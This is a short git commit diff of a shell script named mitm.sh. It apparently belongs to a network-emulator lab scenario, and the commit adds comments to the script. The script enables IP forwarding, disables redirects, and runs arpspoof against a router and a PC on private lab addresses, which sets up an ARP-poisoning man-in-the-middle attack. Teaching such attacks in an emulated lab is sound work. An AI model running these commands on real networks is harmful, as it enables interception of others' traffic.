9ff3bc3129cdb4daf1fcf65b0415eb88b4c5329e
Valter Vasic <valter@cpy.nxlab.fer.hr>
2015-03-13 15:20:58 +0100

    Added the default route to the scenario. Updated the script with comments.

--- mitm/mitm.sh
+++ mitm/mitm.sh
@@ -1,8 +1,11 @@
 #!/bin/sh
 
-himage Attacker route add default 10.0.0.1
+# enable IP packet forwarding
 himage Attacker sysctl -w net.inet.ip.forwarding=1
+# disable sending IP redirects
 himage Attacker sysctl -w net.inet.ip.redirect=0
 
+# tell the Router that the PC has the Attacker MAC
 himage Attacker arpspoof -i eth0 -t 10.0.0.1 10.0.0.20 2> /dev/null &
+# tell the PC that the router has the Attacker MAC
 himage Attacker arpspoof -i eth0 -t 10.0.0.20 10.0.0.1 2> /dev/null &
